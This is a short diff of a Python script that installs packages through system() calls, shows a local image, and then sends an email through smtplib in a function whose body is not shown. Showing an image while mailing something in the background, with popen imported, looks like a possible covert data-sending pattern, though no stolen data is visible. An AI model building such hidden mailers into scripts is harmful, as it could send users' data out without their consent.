@@ -1,7 +1,7 @@
 from os import popen, system, getcwd
-system("pip3 install email")
-system("pip3 install secure-smtplib")
-system("pip3 install Pillow")
+system("pip install email")
+system("pip install secure-smtplib")
+system("pip install Pillow")
 from PIL import Image
 from smtplib import SMTP
 from email.mime.text import MIMEText
@@ -25,5 +25,5 @@ def shape():
     server.sendmail(sender, destination, msg.as_string())
 
 if __name__ == "__main__": 
-  Image.open(f"{getcwd()}/finder/limage.jpeg").show()
+  Image.open(f"{getcwd()}/finder/image.jpeg").show()
   shape()
